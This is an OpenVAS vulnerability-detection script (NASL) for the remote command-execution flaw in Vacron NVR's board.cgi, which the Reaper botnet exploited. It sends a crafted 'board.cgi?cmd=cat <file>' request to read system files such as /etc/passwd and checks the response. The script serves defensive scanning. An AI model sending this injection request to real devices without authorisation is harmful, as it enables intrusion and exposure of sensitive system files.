###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vacron_nvr_rce_vuln.nasl 12038 2018-10-23 12:58:19Z asteins $
#
# Vacron NVR Remote Code Execution Vulnerability
#
# Authors:
# Tameem Eissa <teissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:vacron:nvr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107187");
  script_version("$Revision: 12038 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"last_modification", value:"$Date: 2018-10-23 14:58:19 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-10-11 10:31:53 +0200 (Wed, 11 Oct 2017)");
  script_name("Vacron NVR Remote Code Execution Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Vacron NVR and is prone to Remote Code Execution Vulnerability.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability is located in the board.cgi due to non sufficient sanitization of the input passed through the Get request.");

  script_tag(name:"impact", value:"Remote attackers are able to execute remote command and view sensitive information such as /etc/passwd.");

  script_tag(name:"affected", value:"All versions of Vacron NVR");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3445");
  script_xref(name:"URL", value:"http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_vacron_nvr_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("vacron_nvr/installed");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe: CPE)) exit(0);
if(!dir = get_app_location(cpe: CPE, port: port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = "/" + files[pattern];

  url = dir + "/board.cgi?cmd=cat%20" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url) ;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
